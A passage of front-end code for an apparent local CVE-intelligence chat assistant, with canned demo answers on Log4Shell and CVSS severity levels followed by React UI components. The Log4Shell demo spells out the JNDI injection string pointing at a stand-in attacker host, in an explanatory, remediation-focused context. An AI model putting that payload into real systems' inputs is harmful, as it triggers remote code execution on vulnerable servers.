**Severity**: [CRITICAL] — CVSS **10.0** (AV:N/AC:L/PR:N/UI:N)

Log4Shell is a critical RCE vulnerability in Apache Log4j2's JNDI lookup feature. Disclosed December 9, 2021, it became the fastest-exploited vulnerability in history, affecting virtually every Java-based enterprise stack.

### Attack Mechanism

Log4j2 evaluates JNDI expressions embedded in log messages. An attacker sends \`\${jndi:ldap://attacker.com/x}\` as any user-controlled input — HTTP headers, usernames, form fields — triggering an outbound LDAP request that executes attacker-controlled Java bytecode.

### Scope of Impact

- **Affected**: Apache Log4j2 2.0-beta9 through 2.15.0
- **Products hit**: VMware vCenter, Cisco, Apple iCloud, Amazon AWS, Microsoft Azure AD, Elasticsearch, Twitter
- CISA added CVE-2021-44228 to KEV catalog December 10, 2021

### Remediation

- Upgrade to Log4j2 **2.17.1+** (Java 8), **2.12.4+** (Java 7), or **2.3.2+** (Java 6)
- Temporary: set \`-Dlog4j2.formatMsgNoLookups=true\` JVM flag
- Network: block outbound LDAP (TCP 389) and RMI (TCP 1099)`,

  severity:`## CRITICAL vs HIGH — Severity Classification

### CVSS v3.1 Score Thresholds

- [CRITICAL] CVSS **9.0–10.0** → Emergency patch within 24–72 hours
- [HIGH] CVSS **7.0–8.9** → Priority patch within 7 days
- [MEDIUM] CVSS **4.0–6.9** → Standard cycle within 30 days
- [LOW] CVSS **0.1–3.9** → Next scheduled maintenance

### What Makes a Vulnerability CRITICAL?

CRITICAL scores combine **all** of the following factors:
- **Network accessible** (\`AV:N\`) — remotely exploitable without local access
- **No privileges required** (\`PR:N\`) — zero credentials needed
- **No user interaction** (\`UI:N\`) — no victim action required
- **Complete CIA loss** (\`C:H/I:H/A:H\`) — full confidentiality, integrity, availability impact

### HIGH vs CRITICAL in Practice

HIGH vulnerabilities have at least one mitigating factor:
- Local access only (\`AV:L\`) — e.g., CVE-2022-0847 [HIGH] 7.8 (Dirty Pipe, local LPE only)
- Low-privilege account needed (\`PR:L\`)
- Availability-only impact — e.g., CVE-2023-44487 [HIGH] 7.5 (HTTP/2 DDoS, no data leak)`,

function useTweaks(defaults) {
  const [values, setValues] = React.useState(defaults);
  const setTweak = React.useCallback((keyOrEdits, val) => {
    const edits = typeof keyOrEdits === 'object' && keyOrEdits !== null
      ? keyOrEdits : { [keyOrEdits]: val };
    setValues((prev) => ({ ...prev, ...edits }));
    window.parent.postMessage({ type: '__edit_mode_set_keys', edits }, '*');
    window.dispatchEvent(new CustomEvent('tweakchange', { detail: edits }));
  }, []);
  return [values, setTweak];
}

function TweaksPanel({ title = 'Tweaks', children }) {
  const [open, setOpen] = React.useState(false);
  const dragRef = React.useRef(null);
  const offsetRef = React.useRef({ x: 16, y: 16 });
  const PAD = 16;

  const clampToViewport = React.useCallback(() => {
    const panel = dragRef.current;
    if (!panel) return;
    const w = panel.offsetWidth, h = panel.offsetHeight;
    const maxRight = Math.max(PAD, window.innerWidth - w - PAD);
    const maxBottom = Math.max(PAD, window.innerHeight - h - PAD);
    offsetRef.current = {
      x: Math.min(maxRight, Math.max(PAD, offsetRef.current.x)),
      y: Math.min(maxBottom, Math.max(PAD, offsetRef.current.y)),
    };
    panel.style.right = offsetRef.current.x + 'px';
    panel.style.bottom = offsetRef.current.y + 'px';
  }, []);

  React.useEffect(() => {
    if (!open) return;
    clampToViewport();
    const ro = new ResizeObserver(clampToViewport);
    ro.observe(document.documentElement);
    return () => ro.disconnect();
  }, [open, clampToViewport]);

  React.useEffect(() => {
    const onMsg = (e) => {
      const t = e?.data?.type;
      if (t === '__activate_edit_mode') setOpen(true);
      else if (t === '__deactivate_edit_mode') setOpen(false);
    };
    window.addEventListener('message', onMsg);
    window.parent.postMessage({ type: '__edit_mode_available' }, '*');
    return () => window.removeEventListener('message', onMsg);
  }, []);

  const dismiss = () => {
    setOpen(false);
    window.parent.postMessage({ type: '__edit_mode_dismissed' }, '*');
  };

  const onDragStart = (e) => {
    const panel = dragRef.current;
    if (!panel) return;
    const r = panel.getBoundingClientRect();
    const sx = e.clientX, sy = e.clientY;
    const startRight = window.innerWidth - r.right;
    const startBottom = window.innerHeight - r.bottom;
    const move = (ev) => {
      offsetRef.current = { x: startRight-(ev.clientX-sx), y: startBottom-(ev.clientY-sy) };
      clampToViewport();
    };
    const up = () => { window.removeEventListener('mousemove',move); window.removeEventListener('mouseup',up); };
    window.addEventListener('mousemove', move);
    window.addEventListener('mouseup', up);
  };

  if (!open) return null;
  return (
    <>
      <style>{__TWEAKS_STYLE}</style>
      <div ref={dragRef} className="twk-panel" style={{ right: offsetRef.current.x, bottom: offsetRef.current.y }}>
        <div className="twk-hd" onMouseDown={onDragStart}>
          <b>{title}</b>
          <button className="twk-x" onMouseDown={(e) => e.stopPropagation()} onClick={dismiss}>✕</button>
        </div>
        <div className="twk-body">{children}</div>
      </div>
    </>
  );
}

function __twkIsLight(hex) {
  const h = String(hex).replace('#','');
  const x = h.length===3 ? h.replace(/./g,(c)=>c+c) : h.padEnd(6,'0');
  const n = parseInt(x.slice(0,6),16);
  if(Number.isNaN(n))return true;
  const r=(n>>16)&255,g=(n>>8)&255,b=n&255;
  return r*299+g*587+b*114>148000;
}

function SeverityTag({severity,size='sm'}){
  const cfg=SEVERITY_CONFIG[severity]||{color:'#7A4432',bg:'rgba(122,68,50,.12)',border:'rgba(122,68,50,.35)'};
  const isCrit=severity==='CRITICAL';
  const pad={sm:'2px 6px',md:'3px 10px',lg:'4px 12px'}[size]||'2px 6px';
  const fs={sm:'10px',md:'12px',lg:'13px'}[size]||'10px';
  return(
    <span className={isCrit?'sev-crit':''} style={{display:'inline-flex',alignItems:'center',gap:'4px',padding:pad,borderRadius:'2px',fontSize:fs,fontWeight:700,fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.07em',textTransform:'uppercase',color:cfg.color,background:cfg.bg,border:`1px solid ${cfg.border}`,verticalAlign:'middle',whiteSpace:'nowrap'}}>
      {isCrit&&<span style={{opacity:.7}}>!!</span>}{severity}{isCrit&&<span style={{opacity:.7}}>!!</span>}
    </span>
  );
}

function renderInline(text,kp='ri'){
  if(!text)return null;
  const cveS={background:'rgba(204,48,16,.12)',color:'#FF4422',padding:'1px 7px',borderRadius:'2px',fontFamily:"'JetBrains Mono',monospace",fontSize:'12px',border:'1px solid rgba(204,48,16,.38)',whiteSpace:'nowrap'};
  const codeS={background:'rgba(204,48,16,.08)',color:'#FFA080',padding:'1px 6px',borderRadius:'2px',fontFamily:"'JetBrains Mono',monospace",fontSize:'12px'};
  const rx=/(\*\*[^*]+\*\*|`CVE-\d{4}-\d{4,7}`|CVE-\d{4}-\d{4,7}|`[^`]+`|\[CRITICAL\]|\[HIGH\]|\[MEDIUM\]|\[LOW\])/g;
  return text.split(rx).map((p,i)=>{
    if(!p)return null;
    const k=`${kp}-${i}`;
    if(p.startsWith('**')&&p.endsWith('**'))return<strong key={k} style={{color:'#EDD8C4',fontWeight:700}}>{p.slice(2,-2)}</strong>;
    const cm=p.match(/^`?(CVE-\d{4}-\d{4,7})`?$/);
    if(cm)return<code key={k} style={cveS}>{cm[1]}</code>;
    if(p.startsWith('`')&&p.endsWith('`'))return<code key={k} style={codeS}>{p.slice(1,-1)}</code>;
    if(p==='[CRITICAL]')return<SeverityTag key={k} severity="CRITICAL"/>;
    if(p==='[HIGH]')    return<SeverityTag key={k} severity="HIGH"/>;
    if(p==='[MEDIUM]')  return<SeverityTag key={k} severity="MEDIUM"/>;
    if(p==='[LOW]')     return<SeverityTag key={k} severity="LOW"/>;
    return<span key={k}>{p}</span>;
  });
}

function renderMarkdown(text){
  if(!text)return null;
  const lines=text.split('\n');const out=[];let list=[];let inCode=false;let codeLines=[];let n=0;
  const key=()=>`md-${n++}`;
  const flush=()=>{
    if(!list.length)return;
    const k=key();
    out.push(<ul key={k} style={{margin:'5px 0',padding:0,listStyle:'none'}}>{list.map((item,i)=>(<li key={i} style={{display:'flex',gap:'8px',padding:'3px 0',alignItems:'flex-start'}}><span style={{color:'#CC3010',fontSize:'11px',marginTop:'3px',flexShrink:0}}>&gt;</span><span style={{color:'#C8A898',lineHeight:1.55,flex:1}}>{renderInline(item,`li-${k}-${i}`)}</span></li>))}</ul>);
    list=[];
  };
  lines.forEach((line,idx)=>{
    if(inCode){if(line.startsWith('```')){out.push(<pre key={key()} style={{background:'rgba(204,48,16,.07)',border:'1px solid rgba(204,48,16,.2)',borderRadius:'2px',padding:'12px 14px',margin:'8px 0',overflowX:'auto',fontSize:'12px',lineHeight:1.6,color:'#FFA080',fontFamily:"'JetBrains Mono',monospace"}}><code>{codeLines.join('\n')}</code></pre>);codeLines=[];inCode=false;}else codeLines.push(line);return;}
    if(line.startsWith('```')){flush();inCode=true;return;}
    if(line.startsWith('### ')){flush();out.push(<p key={key()} style={{color:'#CC3010',fontWeight:700,margin:'13px 0 4px',fontSize:'10px',letterSpacing:'.14em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>{renderInline(line.slice(4),`h3-${idx}`)}</p>);}
    else if(line.startsWith('## ')){flush();out.push(<p key={key()} style={{color:'#EDD8C4',fontWeight:700,margin:'13px 0 5px',fontSize:'15px'}}>{renderInline(line.slice(3),`h2-${idx}`)}</p>);}
    else if(line.startsWith('# ')){flush();out.push(<p key={key()} style={{color:'#EDD8C4',fontWeight:700,margin:'13px 0 6px',fontSize:'16px'}}>{renderInline(line.slice(2),`h1-${idx}`)}</p>);}
    else if(/^[-*•]\s+/.test(line)){list.push(line.replace(/^[-*•]\s+/,''));}
    else if(line.trim()==='---'){flush();out.push(<hr key={key()} style={{border:'none',borderTop:'1px solid rgba(204,48,16,.15)',margin:'10px 0'}}/>);}
    else if(line.trim()===''){flush();if(out.length)out.push(<div key={key()} style={{height:'6px'}}/>);}
    else{flush();out.push(<p key={key()} style={{margin:'3px 0',lineHeight:1.6,color:'#C8A898',fontFamily:'Inter,sans-serif',fontSize:'14px'}}>{renderInline(line,`p-${idx}`)}</p>);}
  });
  flush();return out;
}

/* ═══════════════════════════════════════════════

═══════════════════════════════════════════════ */
function MatrixRain({opacity=0.045}){
  const cvRef=useRef(null);
  useEffect(()=>{
    const cv=cvRef.current;if(!cv)return;
    const ctx=cv.getContext('2d');
    let w=cv.offsetWidth||600,h=cv.offsetHeight||400;
    cv.width=w;cv.height=h;
    const fs=12;let cols=Math.floor(w/fs);
    let drops=Array.from({length:cols},()=>-Math.floor(Math.random()*40));
    let raf,tick=0;
    const draw=()=>{
      tick++;
      if(tick%3===0){
        ctx.fillStyle='rgba(13,9,6,.08)';ctx.fillRect(0,0,w,h);
        ctx.font=`${fs}px 'JetBrains Mono',monospace`;
        for(let i=0;i<drops.length;i++){
          if(drops[i]*fs<0){drops[i]++;continue;}
          const b=Math.random();
          ctx.fillStyle=b>0.96?'rgba(237,216,196,.75)':`rgba(204,48,16,${(b*.28+.05).toFixed(2)})`;
          ctx.fillText(b>0.5?'1':'0',i*fs,drops[i]*fs);
          if(drops[i]*fs>h&&Math.random()>0.975)drops[i]=-Math.floor(Math.random()*30);
          drops[i]++;
        }
      }
      raf=requestAnimationFrame(draw);
    };
    raf=requestAnimationFrame(draw);
    const obs=new ResizeObserver(()=>{w=cv.offsetWidth;h=cv.offsetHeight;if(w>0&&h>0){cv.width=w;cv.height=h;cols=Math.floor(w/fs);drops=Array.from({length:cols},()=>-Math.floor(Math.random()*40));}});
    obs.observe(cv);
    return()=>{cancelAnimationFrame(raf);obs.disconnect();};
  },[]);
  return <canvas ref={cvRef} style={{position:'absolute',inset:0,width:'100%',height:'100%',opacity:opacity,pointerEvents:'none',display:'block'}}/>;
}

  useEffect(()=>{if(msg.role==='ai'){const t=setTimeout(()=>setScanning(false),760);return()=>clearTimeout(t);}},[]);
  if(msg.role==='user') return(
    <div className="msg-in" style={{display:'flex',justifyContent:'flex-end',marginBottom:12,padding:'0 24px'}}>
      <div style={{maxWidth:'68%',background:'rgba(204,48,16,.08)',border:'1px solid rgba(204,48,16,.28)',borderRadius:'2px 2px 0 2px',padding:compact?'6px 10px':'10px 14px'}}>
        <div style={{fontSize:'9px',color:'rgba(204,48,16,.5)',marginBottom:'5px',fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.08em'}}>&gt;_ INPUT // {fmtTime(msg.ts)}</div>
        <p style={{color:C.text,margin:0,lineHeight:1.65,fontSize:'13px',whiteSpace:'pre-wrap',fontFamily:'Inter,sans-serif'}}>{msg.content}</p>
      </div>
    </div>
  );
  return(
    <div className="msg-in" style={{display:'flex',justifyContent:'flex-start',marginBottom:12,padding:'0 24px'}}>
      <div style={{maxWidth:'85%',background:'#140E09',border:'1px solid rgba(204,48,16,.25)',borderLeft:'3px solid #CC3010',borderRadius:'0 2px 2px 2px',padding:compact?'7px 10px':'12px 14px',position:'relative',overflow:'hidden'}}>
        {scanning&&<div className="scan-line"/>}
        <div style={{display:'flex',alignItems:'center',gap:'8px',marginBottom:10,paddingBottom:'8px',borderBottom:'1px solid rgba(204,48,16,.12)'}}>
          <span style={{fontSize:'10px',color:'rgba(204,48,16,.6)'}}>▶</span>
          <span style={{fontSize:'10px',fontWeight:700,color:'#CC3010',letterSpacing:'.1em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>SECURELLM RESPONSE</span>
          {msg.isDemo&&<span style={{fontSize:'9px',color:C.dim,border:'1px solid rgba(204,48,16,.2)',padding:'1px 4px',fontFamily:"'JetBrains Mono',monospace"}}>DEMO</span>}
          <span style={{fontSize:'9px',color:C.dim,marginLeft:'auto',fontFamily:"'JetBrains Mono',monospace"}}>{fmtTime(msg.ts)}</span>
        </div>
        <div style={{fontSize:'14px'}}>{renderMarkdown(msg.content)}{streamingId===msg.id&&<span className="stream-cursor">▌</span>}</div>
        <div style={{display:'flex',alignItems:'center',gap:'6px',marginTop:10,paddingTop:8,borderTop:'1px solid rgba(204,48,16,.1)',flexWrap:'wrap'}}>
          {msg.latency!=null&&<span style={{fontSize:'9px',color:C.dim,fontFamily:"'JetBrains Mono',monospace",flex:1,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>GEN: {(msg.latency/1000).toFixed(1)}s // {msg.tokens.toLocaleString()} TOKENS</span>}
          <div style={{display:'flex',gap:'3px',flexShrink:0}}>
            <FBtn icon="copy" active={copiedId===msg.id} onClick={()=>onCopy(msg.id,msg.content)} label={copiedId===msg.id?'[COPIED]':'[COPY]'}/>
            <FBtn icon="up"   active={feedback[msg.id]==='up'}   onClick={()=>onFeedback(msg.id,'up')}/>
            <FBtn icon="down" active={feedback[msg.id]==='down'} onClick={()=>onFeedback(msg.id,'down')}/>
          </div>
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   INPUT AREA
═══════════════════════════════════════════════ */
function AngToggle({on,onToggle}){
  return(
    <div onClick={onToggle} style={{width:28,height:14,background:on?'rgba(204,48,16,.3)':'rgba(204,48,16,.1)',border:`1px solid ${on?'rgba(255,68,34,.5)':'rgba(204,48,16,.25)'}`,position:'relative',cursor:'pointer',transition:'all .2s',borderRadius:'2px',flexShrink:0}}>
      <div style={{position:'absolute',top:'1px',left:on?'14px':'1px',width:10,height:10,background:on?'#FF4422':'#3C1A08',transition:'all .2s',borderRadius:'1px'}}/>
    </div>
  );
}

function InputArea({value,onChange,onSend,temperature,setTemperature,maxTokens,setMaxTokens,streamEnabled,setStreamEnabled,disabled}){
  const [focused,setFocused]=useState(false);
  const taRef=useRef(null);
  const hChange=e=>{onChange(e.target.value);const ta=taRef.current;if(ta){ta.style.height='auto';ta.style.height=Math.min(ta.scrollHeight,180)+'px';}};
  const hPaste=e=>{setTimeout(()=>{const ta=taRef.current;if(!ta)return;onChange(ta.value);if(ta){ta.style.height='auto';ta.style.height=Math.min(ta.scrollHeight,180)+'px';}},0);};
  const hKey=e=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();if(value.trim()&&!disabled)onSend();}};
  return(
    <div style={{padding:'10px 24px 16px',background:'#0D0906',borderTop:'1px solid rgba(204,48,16,.2)',flexShrink:0}}>
      <div style={{marginBottom:'5px',fontSize:'10px',color:'rgba(204,48,16,.4)',fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.04em'}}>ROOT@SECURELLM:~#</div>
      <div className={`inp-wrap ${focused?'on':''}`}>
        <div style={{background:'#140E09',padding:'10px 12px',display:'flex',gap:'10px',alignItems:'flex-end'}}>
          <textarea ref={taRef} value={value} onChange={hChange} onInput={hChange} onPaste={hPaste} onKeyDown={hKey}
            onFocus={()=>setFocused(true)} onBlur={()=>setFocused(false)}
            disabled={disabled} rows={1}
            placeholder="Ask about any CVE, threat, or vulnerability…"
            style={{flex:1,background:'none',border:'none',outline:'none',color:C.text,fontSize:'13px',lineHeight:1.6,resize:'none',fontFamily:'Inter,sans-serif',minHeight:'22px',maxHeight:'180px',overflowY:'auto'}}
          />
          <button onClick={onSend} disabled={!value.trim()||disabled}
            style={{padding:'6px 14px',background:value.trim()&&!disabled?'#CC3010':'rgba(204,48,16,.08)',border:`1px solid ${value.trim()&&!disabled?'#FF4422':'rgba(204,48,16,.2)'}`,cursor:value.trim()&&!disabled?'pointer':'not-allowed',color:value.trim()&&!disabled?C.text:C.dim,fontSize:'10px',fontWeight:700,fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.08em',textTransform:'uppercase',borderRadius:'2px',flexShrink:0,transition:'all .18s'}}>
            EXECUTE
          </button>
        </div>
      </div>
      <div style={{display:'flex',alignItems:'center',gap:'10px',marginTop:'7px',fontSize:'9px',fontFamily:"'JetBrains Mono',monospace",color:C.dim,flexWrap:'wrap'}}>
        <span>TEMP</span>
        <input type="range" min=".1" max="1" step=".1" value={temperature} onChange={e=>setTemperature(parseFloat(e.target.value))} className="slider" style={{width:64}}/>
        <span style={{color:C.muted,minWidth:18}}>{temperature.toFixed(1)}</span>
        <span style={{color:'rgba(204,48,16,.2)'}}>|</span>
        <span>TOKENS</span>
        <select value={maxTokens} onChange={e=>setMaxTokens(parseInt(e.target.value))}
          style={{background:'rgba(204,48,16,.06)',border:'1px solid rgba(204,48,16,.2)',color:C.muted,fontSize:'10px',padding:'1px 5px',fontFamily:"'JetBrains Mono',monospace",cursor:'pointer',outline:'none',borderRadius:'2px'}}>
          {[100,200,500,1000].map(n=><option key={n} value={n}>{n}</option>)}
        </select>
        <span style={{color:'rgba(204,48,16,.2)'}}>|</span>
        <span>STREAM</span>
        <AngToggle on={streamEnabled} onToggle={()=>setStreamEnabled(v=>!v)}/>
        <span style={{marginLeft:'auto',color:'rgba(204,48,16,.15)'}}>⏎ EXEC · ⇧⏎ NEWLINE</span>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   SETTINGS MODAL
═══════════════════════════════════════════════ */
function SettingsModal({onClose}){
  return(
    <div onClick={onClose} style={{position:'fixed',inset:0,background:'rgba(0,0,0,.8)',zIndex:1001,display:'flex',alignItems:'center',justifyContent:'center'}}>
      <div onClick={e=>e.stopPropagation()} style={{background:C.bg2,border:`1px solid ${C.brd2}`,padding:'24px',width:'420px',maxHeight:'80vh',overflowY:'auto'}}>
        <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:'20px',paddingBottom:'12px',borderBottom:`1px solid ${C.brd}`}}>
          <div style={{display:'flex',alignItems:'center',gap:'8px'}}>
            <span style={{color:C.red,fontSize:'12px'}}>▶</span>
            <span style={{fontSize:'12px',fontWeight:700,color:C.text,fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.1em',textTransform:'uppercase'}}>// SETTINGS</span>
          </div>
          <button onClick={onClose} style={{background:'none',border:`1px solid ${C.brd}`,cursor:'pointer',padding:'2px 8px',color:C.muted,fontSize:'13px',fontFamily:"'JetBrains Mono',monospace"}}>[ × ]</button>
        </div>
        <div style={{marginBottom:'16px'}}>
          <div style={{fontSize:'9px',color:C.dim,letterSpacing:'.14em',textTransform:'uppercase',fontWeight:700,marginBottom:'8px',fontFamily:"'JetBrains Mono',monospace"}}>API ENDPOINT</div>
          <div style={{background:'rgba(0,0,0,.3)',border:`1px solid ${C.brd}`,padding:'8px 12px',fontFamily:"'JetBrains Mono',monospace",fontSize:'11px',color:C.muted}}>http://localhost:8000/query</div>
          <div style={{fontSize:'10px',color:C.dim,marginTop:'5px',fontFamily:"'JetBrains Mono',monospace"}}>POST · message · history · max_new_tokens · temperature · top_p · stream</div>
        </div>
        <div style={{marginBottom:'16px'}}>
          <div style={{fontSize:'9px',color:C.dim,letterSpacing:'.14em',textTransform:'uppercase',fontWeight:700,marginBottom:'8px',fontFamily:"'JetBrains Mono',monospace"}}>MODEL CONFIG</div>
          {[['Model','Meta-Llama-3.1-8B-Instruct'],['Fine-tuning','LoRA (4-bit NF4)'],['Training data','9,992 NVD CVE records'],['Device','RTX 4050 · CUDA FP16'],['Context','4,096 tokens'],['Generation','~60–130s response']].map(([k,v])=>(
            <div key={k} style={{display:'flex',justifyContent:'space-between',padding:'6px 0',borderBottom:`1px solid ${C.brd}`,gap:'16px'}}>
              <span style={{fontSize:'10px',color:C.dim,fontFamily:"'JetBrains Mono',monospace"}}>{k}</span>
              <span style={{fontSize:'10px',color:C.muted,textAlign:'right',fontFamily:"'JetBrains Mono',monospace"}}>{v}</span>
            </div>
          ))}
        </div>
        <div style={{padding:'12px',background:'rgba(204,48,16,.04)',border:`1px solid ${C.brd}`}}>
          <div style={{fontSize:'9px',color:C.red,fontWeight:700,marginBottom:'6px',fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.1em'}}>// ABOUT</div>
          <p style={{fontSize:'11px',color:C.muted,lineHeight:1.65,fontFamily:'Inter,sans-serif'}}>SecureLLM is a local threat intelligence assistant. All processing is done on your machine — no data leaves your environment.</p>
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   APP
═══════════════════════════════════════════════ */
function App(){
  const [messages,setMessages]=useState([]);
  const [activeConv,setActiveConv]=useState(null);
  const [input,setInput]=useState('');
  const [typing,setTyping]=useState(false);
  const [error,setError]=useState(null);
  const [cveData,setCveData]=useState(null);
  const [cvePanelOpen,setCvePanelOpen]=useState(true);
  const [temp,setTemp]=useState(0.2);
  const [maxTok,setMaxTok]=useState(500);
  const [stream,setStream]=useState(false);
  const [copiedId,setCopiedId]=useState(null);
  const [feedback,setFeedback]=useState({});
  const msgsRef=useRef(null);
  const [tweaks,setTweak]=useTweaks(TWEAK_DEFAULTS);
  const [streamingId,setStreamingId]=useState(null);
  const [showSettings,setShowSettings]=useState(false);

  useEffect(()=>{if(msgsRef.current)msgsRef.current.scrollTop=msgsRef.current.scrollHeight;},[messages,typing]);

  const send=async(text)=>{
    const content=(text||input).trim();
    if(!content||typing)return;
    const userMsg={id:Date.now()+'',role:'user',content,ts:new Date()};
    setMessages(prev=>[...prev,userMsg]);
    setInput('');setTyping(true);setError(null);
    const ta=document.querySelector('textarea');if(ta)ta.style.height='auto';
    const history=messages.map(m=>({role:m.role==='ai'?'assistant':'user',content:m.content}));
    let resp=null,isDemo=false;
    try{
      const res=await fetch('http://localhost:8000/query',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:content,history,max_new_tokens:maxTok,temperature:temp,top_p:0.9,stream:false}),signal:AbortSignal.timeout(180000)});
      if(!res.ok)throw new Error(`HTTP ${res.status}`);
      resp=await res.json();
    }catch{
      isDemo=true;
      const demo=getDemoResponse(content);
      await new Promise(r=>setTimeout(r,1300+Math.random()*1400));
      resp={response:demo.response,latency_ms:demo.latency_ms};
      setError('API UNREACHABLE: localhost:8000 — SHOWING DEMO RESPONSE');
    }
    setTyping(false);
    const msgId=(Date.now()+1)+'';
    if(stream){
      const aiMsg={id:msgId,role:'ai',content:'',ts:new Date(),latency:null,tokens:0,isDemo};
      setMessages(prev=>[...prev,aiMsg]);setStreamingId(msgId);
      const words=resp.response.split(' ');let built='';
      for(let i=0;i<words.length;i++){built+=(i>0?' ':'')+words[i];setMessages(prev=>prev.map(m=>m.id===msgId?{...m,content:built}:m));await new Promise(r=>setTimeout(r,20+Math.random()*12));}
      setStreamingId(null);
      setMessages(prev=>prev.map(m=>m.id===msgId?{...m,latency:resp.latency_ms,tokens:estimateTokens(resp.response)}:m));
    }else{
      setMessages(prev=>[...prev,{id:msgId,role:'ai',content:resp.response,ts:new Date(),latency:resp.latency_ms,tokens:estimateTokens(resp.response),isDemo}]);
    }
    const cves=extractCVEs(resp.response);
    if(cves.length&&CVE_DATABASE[cves[0]]){setCveData(CVE_DATABASE[cves[0]]);setCvePanelOpen(true);}
  };

  const handleCopy=(id,text)=>{
    navigator.clipboard.writeText(text).catch(()=>{const ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);});
    setCopiedId(id);setTimeout(()=>setCopiedId(null),2000);
  };
  const clearAll=()=>{setMessages([]);setCveData(null);setError(null);setActiveConv(null);};

  return(
    <div style={{height:'100vh',display:'flex',flexDirection:'column',background:'#0D0906',color:C.text,overflow:'hidden'}}>
      <TopNav onNewChat={clearAll} cvePanelOpen={cvePanelOpen} onToggleCVE={()=>setCvePanelOpen(v=>!v)} onSettings={()=>setShowSettings(true)}/>
      {error&&(
        <div style={{background:'rgba(204,48,16,.08)',borderBottom:'1px solid rgba(204,48,16,.25)',padding:'6px 24px',display:'flex',alignItems:'center',gap:'9px',color:'#FF7070',fontSize:'10px',flexShrink:0,fontFamily:"'JetBrains Mono',monospace"}}>
          <span style={{color:'#FF4422'}}>!!</span>{error}
          <button onClick={()=>setError(null)} style={{marginLeft:'auto',background:'none',border:'none',color:'#FF4422',cursor:'pointer',fontSize:'14px',fontFamily:'inherit'}}>×</button>
        </div>
      )}
      <div style={{flex:1,display:'flex',overflow:'hidden'}}>
        <Sidebar activeConvId={activeConv} onSelectConv={id=>{
          const conv=MOCK_CONVERSATIONS.find(c=>c.id===id);
          setActiveConv(id);setError(null);
          if(conv){
            const demo=getDemoResponse(conv.title);
            const userMsg={id:'demo-u-'+id,role:'user',content:conv.title,ts:conv.ts};
            const aiMsg={id:'demo-a-'+id,role:'ai',content:demo.response,ts:new Date(conv.ts.getTime()+demo.latency_ms),latency:demo.latency_ms,tokens:estimateTokens(demo.response),isDemo:true};
            setMessages([userMsg,aiMsg]);
            const cves=extractCVEs(demo.response);
            if(cves.length&&CVE_DATABASE[cves[0]]){setCveData(CVE_DATABASE[cves[0]]);setCvePanelOpen(true);}
            else setCveData(null);
          }else{setMessages([]);setCveData(null);}
        }} onNewChat={clearAll}/>
        <div style={{flex:1,display:'flex',flexDirection:'column',overflow:'hidden',minWidth:0,position:'relative'}}>
          <MatrixRain opacity={tweaks.rainOpacity}/>
          <style dangerouslySetInnerHTML={{__html:`:root{--red:${tweaks.primaryColor};--red2:${PALETTE_HL[tweaks.primaryColor]||'#FF4422'};--brd:${tweaks.primaryColor}47;--brd2:${PALETTE_HL[tweaks.primaryColor]||'#FF4422'}8C;--rg:${tweaks.primaryColor}59}${!tweaks.showScanlines?'body::after{display:none}':''}`}}/>
          <div ref={msgsRef} className="chat-bg" style={{flex:1,overflowY:'auto',paddingTop:18,position:'relative',zIndex:1}}>
            {messages.length===0&&!typing
              ?<EmptyState onSuggest={send}/>
              :<>
                {messages.map(m=><Message key={m.id} msg={m} onCopy={handleCopy} feedback={feedback} onFeedback={(id,t)=>setFeedback(p=>({...p,[id]:p[id]===t?null:t}))} copiedId={copiedId} compact={tweaks.compact} streamingId={streamingId}/>)}
                {typing&&<TypingIndicator/>}
                <div style={{height:16}}/>
              </>
            }
          </div>
          <InputArea value={input} onChange={setInput} onSend={send} temperature={temp} setTemperature={setTemp} maxTokens={maxTok} setMaxTokens={setMaxTok} streamEnabled={stream} setStreamEnabled={setStream} disabled={typing}/>
        </div>
        <CVEPanel cveData={cveData} isCollapsed={!cvePanelOpen} onToggle={()=>setCvePanelOpen(false)}/>
      </div>
      <TweaksPanel>
        <TweakSection label="Theme"/>
        <TweakColor label="Primary color" value={tweaks.primaryColor}
          options={['#CC3010','#CC6010','#AA2080']}
          onChange={v=>setTweak('primaryColor',v)}/>
        <TweakSlider label="Binary rain" value={tweaks.rainOpacity} min={0} max={0.09} step={0.005}
          onChange={v=>setTweak('rainOpacity',v)}/>
        <TweakToggle label="CRT scanlines" value={tweaks.showScanlines}
          onChange={v=>setTweak('showScanlines',v)}/>
        <TweakToggle label="Compact mode" value={tweaks.compact}
          onChange={v=>setTweak('compact',v)}/>
      </TweaksPanel>
      {showSettings&&<SettingsModal onClose={()=>setShowSettings(false)}/>}
    </div>
  );
}

ReactDOM.createRoot(document.getElementById('root')).render(<App/>);
</script>
</body>
</html>
